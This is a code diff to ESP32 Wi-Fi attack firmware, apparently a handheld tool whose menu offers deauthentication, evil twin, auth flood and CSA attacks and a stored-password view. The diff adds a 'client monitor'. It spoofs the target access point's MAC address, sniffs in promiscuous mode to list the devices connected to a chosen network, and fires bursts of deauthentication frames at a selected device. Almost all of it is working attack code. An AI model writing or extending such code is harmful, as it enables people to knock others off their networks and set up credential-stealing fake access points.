@@ -68,7 +68,9 @@ enum State {
   BLE_SCAN,
   CLOUD_SYNC,
   MACRO_MENU,
-  MACRO_RUNNING
+  MACRO_RUNNING,
+  AP_LIST_CLIENT,
+  CLIENT_MONITOR_RUNNING
 };
 State currentState = MAIN_MENU;
 
@@ -76,7 +78,7 @@ State currentState = MAIN_MENU;
 
 int menuSelection = 0;
 int menuScrollPos = 0;
-const int MENU_COUNT = 15;
+const int MENU_COUNT = 16;
 const char* menuItems[] = {
   "DEAUTH MANUAL",
   "EVIL TWIN",
@@ -92,7 +94,8 @@ const char* menuItems[] = {
   "OTA UPDATE",
   "BLE SCAN",
   "CLOUD SYNC",
-  "MACRO"
+  "MACRO",
+  "CLIENT MONITOR"
 };
 
 volatile AttackMode g_attackMode = ATK_IDLE;
@@ -156,6 +159,12 @@ int macroPhase = 0;
 int macroSelection = 0;
 unsigned long macroPhaseStart = 0;
 String cliBuf = "";
+bool isClientMonitorRunning = false;
+int clientSelection = 0;
+int clientScroll = 0;
+ClientEntry g_clients[CLIENT_MAX];
+int g_clientCount = 0;
+portMUX_TYPE g_clientMux = portMUX_INITIALIZER_UNLOCKED;
 bool g_bleScanning = false;
 unsigned long g_bleScanStart = 0;
 
@@ -351,6 +360,11 @@ void drawMenuIcon(int idx, int x, int y, uint16_t color) {
       tft.drawRect(x+2, y+4, 10, 7, color);
       tft.drawRect(x+4, y+2, 6, 7, color);
       tft.drawLine(x+7, y+9, x+7, y+13, color);
+      break;
+    case 15:
+      tft.drawCircle(x+7, y+7, 4, color);
+      tft.drawCircle(x+7, y+7, 7, color);
+      tft.drawFastHLine(x+2, y+13, 10, color);
       break;
   }
 }
@@ -1966,6 +1980,10 @@ void updateVerification() {
 // ═══════════════════════════════════════════════
 // Navigation
 // ═══════════════════════════════════════════════
+void startClientMonitor();
+void stopClientMonitor();
+void drawClientMonitor();
+
 void handleAPListNavigation() {
   if (digitalRead(BTN_TOP) == LOW) {
     delay(200);
@@ -1982,6 +2000,13 @@ void handleAPListNavigation() {
       g_targetChannel = WiFi.channel(selectedIdx);
       targetSSID = WiFi.SSID(selectedIdx);
 
+      if (currentState == AP_LIST_CLIENT) {
+        currentState = CLIENT_MONITOR_RUNNING;
+        startClientMonitor();
+        drawClientMonitor();
+        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        return;
+      }
       if (currentState == AP_LIST_CSA) {
         currentState = CSA_RUNNING;
         startCSAAttack();
@@ -2601,6 +2626,91 @@ void handleSerialCLI() {
   }
 }
 
+// ------------------------------------------------------------------
+// Client Monitor (lihat klien/station terhubung ke AP target)
+// ------------------------------------------------------------------
+void drawClientMonitor() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("CLIENT MONITOR", TFT_MAGENTA);
+  tft.setTextFont(1);
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(4, 28);
+  tft.print("MAC               RSSI  PKT");
+
+  int shown = 0;
+  for (int i = clientScroll; i < g_clientCount && shown < 4; i++) {
+    int y = 40 + shown * 18;
+    if (i == clientSelection) {
+      tft.fillRect(2, y - 2, 236, 17, TFT_DARKGREEN);
+    }
+    tft.setTextColor(TFT_WHITE, i == clientSelection ? TFT_DARKGREEN : TFT_BLACK);
+    tft.setCursor(4, y);
+    char buf[64];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %4d  %6u",
+      g_clients[i].mac[0], g_clients[i].mac[1], g_clients[i].mac[2],
+      g_clients[i].mac[3], g_clients[i].mac[4], g_clients[i].mac[5],
+      g_clients[i].rssi, (unsigned)g_clients[i].packets);
+    tft.print(buf);
+    shown++;
+  }
+
+  if (g_clientCount == 0) {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.setCursor(4, 48);
+    tft.print("Menunggu client terhubung...");
+  }
+
+  int by = 40 + shown * 18 + 2;
+  if (clientSelection == g_clientCount) {
+    tft.fillRect(2, by - 2, 236, 17, TFT_RED);
+    tft.setTextColor(TFT_WHITE, TFT_RED);
+  } else {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  }
+  tft.setCursor(4, by);
+  tft.print("< KEMBALI >");
+
+  drawFooter("ATAS: Pilih | BAWAH: Deauth/Kembali");
+}
+
+void startClientMonitor() {
+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
+  if (memcmp(mac, g_targetBSSID, 6) != 0) {
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+    if (macErr != ESP_OK) {
+      Serial.printf("[WARN] ClientMon set_mac failed (%d)\n", macErr);
+    }
+    delay(50);
+  }
+  WiFi.softAP("Client_Mon", "12345678", g_targetChannel, 1); delay(300);
+  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+  portENTER_CRITICAL(&g_clientMux);
+  g_clientCount = 0;
+  portEXIT_CRITICAL(&g_clientMux);
+  clientSelection = 0;
+  clientScroll = 0;
+  applyPromiscuousFilter(false);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  isClientMonitorRunning = true;
+  g_attackMode = ATK_CLIENT_MONITOR;
+  Serial.printf("[CLIENT] Monitor %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
+    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
+    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
+    g_targetChannel, targetSSID.c_str());
+}
+
+void stopClientMonitor() {
+  isClientMonitorRunning = false;
+  g_attackMode = ATK_IDLE;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+  Serial.println("[CLIENT] Monitor berhenti");
+}
+
 void setup() {
   Serial.begin(115200);
   randomSeed(esp_random());
@@ -2891,13 +3001,28 @@ void loop() {
           macroSelection = 0;
           drawMacroMenu();
           break;
+        case 15: {
+          doScanAnimation();
+          if (apCount == -1) { drawMainMenu(); }
+          else if (apCount == 0) {
+            tft.fillScreen(TFT_BLACK);
+            drawHeader("NO WIFI FOUND", TFT_RED);
+            delay(1500); drawMainMenu();
+          } else {
+            currentState = AP_LIST_CLIENT;
+            selectedIdx = 0; apScrollPos = 0;
+            drawAPList();
+          }
+          break;
+        }
       }
     }
   }
   else if (currentState == AP_LIST_DEAUTH ||
            currentState == AP_LIST_EVIL_TWIN ||
            currentState == AP_LIST_AUTH_FLOOD ||
-           currentState == AP_LIST_CSA) {
+           currentState == AP_LIST_CSA ||
+           currentState == AP_LIST_CLIENT) {
     handleAPListNavigation();
   }
   else if (currentState == TEMPLATE_SELECT) {
@@ -3003,6 +3128,37 @@ void loop() {
       isMacroRunning = false;
       currentState = MAIN_MENU;
       drawMainMenu();
+    }
+  }
+  else if (currentState == CLIENT_MONITOR_RUNNING) {
+    if (millis() - lastUI > 500) { drawClientMonitor(); lastUI = millis(); }
+    if (digitalRead(BTN_TOP) == LOW) {
+      delay(200);
+      clientSelection++;
+      if (clientSelection > g_clientCount) clientSelection = 0;
+      if (clientSelection < clientScroll) clientScroll = clientSelection;
+      else if (clientSelection >= clientScroll + 4) clientScroll = clientSelection - 3;
+      drawClientMonitor();
+    }
+    if (digitalRead(BTN_BOTTOM) == LOW) {
+      delay(200);
+      if (clientSelection == g_clientCount) {
+        stopClientMonitor();
+        currentState = MAIN_MENU;
+        drawMainMenu();
+      } else if (g_clientCount > 0 && clientSelection < g_clientCount) {
+        uint8_t* cmac = g_clients[clientSelection].mac;
+        for (int i = 0; i < cfg_deauth_burst; i++) {
+          sendDeauthFrame(cmac, g_targetBSSID, 0x07);
+        }
+        Serial.printf("[CLIENT] Deauth %02X:%02X:%02X:%02X:%02X:%02X\n",
+          cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
+        tft.fillRect(0, 104, 240, 10, TFT_BLACK);
+        tft.setTextFont(1);
+        tft.setTextColor(TFT_RED, TFT_BLACK);
+        tft.setCursor(4, 104);
+        tft.print("DEAUTH OK");
+      }
     }
   }
   else if (currentState == VIEW_PASSWORDS) {
